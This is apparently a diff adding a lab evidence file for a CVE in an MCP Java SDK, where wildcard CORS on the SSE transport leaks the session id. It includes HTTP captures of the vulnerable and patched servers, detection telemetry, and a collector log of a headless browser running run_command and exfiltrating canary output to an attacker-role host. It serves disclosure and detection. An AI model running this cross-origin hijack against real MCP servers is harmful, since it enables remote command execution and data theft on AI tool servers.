@@ -1,0 +1,72 @@
+CVE-2026-34237 - MCP Java SDK wildcard CORS session hijack
+Supporting evidence. VM-verified 2026-08-02 (host ai-Standard-PC-Q35-ICH9-2009). Server: Meridian CI
+(Spring Boot, MCP serverInfo name buildbot-mcp 2.3.0) on io.modelcontextprotocol.sdk:mcp-core 1.0.0 (the
+affected release). Benign canary only; labnet-internal (internal: true, no egress, no published ports).
+
+Every excerpt below was re-captured on 2026-08-02, after the range moved to the lab's real role names
+(mcp.lab.consulereit.nl / attacker.lab.consulereit.nl / collector.lab.consulereit.nl). The earlier
+capture was not edited to match the rename: a recorded observation is either re-taken or left alone.
+
+The primary, replayable protocol capture is in vuln.txt (harness RAW HTTP EVIDENCE block). This file adds
+the vulnerable-vs-fixed transport diff, the app-layer telemetry the detection consumes, and the
+real-browser drive-by.
+
+Note on the Origin scheme. Sections 1 and 2 read https:// because the harness forges the Origin a browser
+sends once Traefik terminates TLS in front of the attacker page, which is what the exposed tiers and the
+published clip show. Sections 3 and 4 read http:// because they are the SEALED tier's own headless
+Chromium talking straight to the nginx container, where there is no TLS. Same host, same attack, two
+schemes for a real reason.
+
+== 1. VULNERABLE (mcp-core 1.0.0): the SSE transport emits wildcard CORS and discloses the session id ==
+   Cross-origin GET from a foreign Origin, as captured by the harness on the wire:
+
+   > GET /mcp/sse HTTP/1.1
+   > Host: mcp.lab.consulereit.nl:8080
+   > accept: text/event-stream
+   > origin: https://attacker.lab.consulereit.nl
+   < HTTP/1.1 200
+   < access-control-allow-origin: *
+   < content-type: text/event-stream;charset=UTF-8
+   < [SSE] event: endpoint
+   < [SSE] data: /mcp/message?sessionId=36dcd659-cb80-4851-9d83-76797fc484bb
+
+   The wildcard header is present for the cross-origin request; the per-connection session id follows on
+   the `endpoint` event. Reading it cross-origin IS stealing the session.
+
+== 2. FIXED (mcp-core 1.0.1, one dependency bump): SAME request, NO wildcard header ==
+   Identical Meridian CI source built against the patched SDK (service mcp-ci-fixed):
+
+   > GET /mcp/sse HTTP/1.1
+   > Host: mcp-fixed.lab.consulereit.nl:8080
+   > accept: text/event-stream
+   > origin: https://attacker.lab.consulereit.nl
+   < HTTP/1.1 200
+   < content-type: text/event-stream;charset=UTF-8
+   < [SSE] event: endpoint
+   < [SSE] data: /mcp/message?sessionId=25bb94a8-cf25-4d73-998f-73fcdb413c2c
+
+   No Access-Control-Allow-Origin header. The endpoint event still carries a session id (the transport
+   still works for legitimate same-origin clients), but a browser Origin can no longer READ the stream,
+   so the session id is never disclosed cross-origin and the attack stops at the transport (NO-REPRO;
+   see fixed.txt).
+
+== 3. Raw app-layer telemetry the detection consumes (event.dataset: mcp.access) ==
+   RAW request facts only, no verdict fields. The SOC ingest pipeline derives mcp.cors.cross_origin from
+   http.request.headers.origin vs .host. This record is the real-browser cross-origin read (note the
+   HeadlessChrome user agent and source 172.28.0.68, the browser container):
+
+   {"@timestamp":"2026-08-02T09:48:52.735788196Z","log.logger":"mcp.access","message":"GET /mcp/sse -> 200",
+    "http.request.method":"GET","url.path":"/mcp/sse","http.response.status_code":"200",
+    "http.request.headers.origin":"http://attacker.lab.consulereit.nl","http.request.headers.host":"mcp.lab.consulereit.nl:8080",
+    "user_agent.original":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/124.0.0.0 Safari/537.36",
+    "source.ip":"172.28.0.68","event.dataset":"mcp.access","ecs.version":"8.11"}
+
+== 4. Real browser (headless Chromium) drives the attack cross-origin ==
+   The attacker page engine/attacker/web/remote.html, opened by a real browser, reads the endpoint event
+   (EventSource), relays JSON-RPC as text/plain POSTs (CORS-simple, no preflight), drives run_command, and
+   exfiltrates the canary. Collector hit (note the HeadlessChrome user agent and the LAB_CANARY output):
+
+   [collector] EXFIL {"ts":"2026-08-02T09:48:52.860Z","method":"POST","path":"/pwned","from":"::ffff:172.28.0.68",
+    "ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/124.0.0.0 Safari/537.36",
+    "body":{"module":"01-cors-hijack-remote","sessionId":"8736e8a2-cd69-4194-a1b8-b4419064608a",
+            "output":"uid=10001(appsvc) gid=10001(appsvc) groups=10001(appsvc)\n15bd7572587a\nLAB_CANARY_51"}}
